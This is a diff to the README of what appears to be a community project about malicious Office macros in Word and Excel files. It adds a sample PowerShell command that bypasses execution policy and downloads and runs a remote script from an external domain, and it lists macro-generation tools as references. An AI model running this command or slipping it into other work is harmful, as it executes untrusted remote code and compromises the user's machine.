@@ -21,6 +21,11 @@ This is a community project at https://www.codeforatlanta.org/
 1. Word docs, 97+
 2. Excel
 
+## Example Malicious MAcro / Command
+```powershell
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoP -NoExit -Command iex((New-Object System.Net.WebClient).DownloadString('http://qwdiqjwdwqu9daquwddd.com/REX/slick.php?utma=torzd'))
+```
+
 ## References
 - https://github.com/curi0usJack/luckystrike
 - https://github.com/enigma0x3/Generate-Macro
